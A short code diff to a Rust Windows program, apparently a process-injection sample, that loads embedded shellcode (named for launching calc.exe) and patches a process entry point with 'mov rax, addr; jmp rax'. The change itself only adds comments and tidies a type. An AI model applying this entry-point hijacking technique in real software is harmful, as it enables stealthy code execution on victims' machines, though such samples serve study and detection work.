@@ -20,7 +20,7 @@ use windows_sys::Win32::System::Threading::{
 #[cfg(target_os = "windows")]
 fn main() {
     let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-    let shellcode_size: usize = shellcode.len();
+    let shellcode_size = shellcode.len();
     let program = b"C:\\Windows\\System32\\calc.exe\0";
 
     unsafe {
@@ -190,12 +190,14 @@ fn main() {
         let mut ep_buffer = vec![];
         match pe_header.Machine {
             0x8664_u16 => {
+                // rex; mov eax
                 ep_buffer.push(0x48_u8);
                 ep_buffer.push(0xb8_u8);
                 let mut shellcode_addr = (addr as usize).to_le_bytes().to_vec();
                 ep_buffer.append(&mut shellcode_addr);
             }
             0x14c_u16 => {
+                // mov eax
                 ep_buffer.push(0xb8_u8);
                 let mut shellcode_addr = (addr as usize).to_le_bytes().to_vec();
                 ep_buffer.append(&mut shellcode_addr);
@@ -205,6 +207,7 @@ fn main() {
                 pe_header.Machine
             ),
         }
+        // jmp [r|e]ax
         ep_buffer.push(0xff_u8);
         ep_buffer.push(0xe0_u8);
 
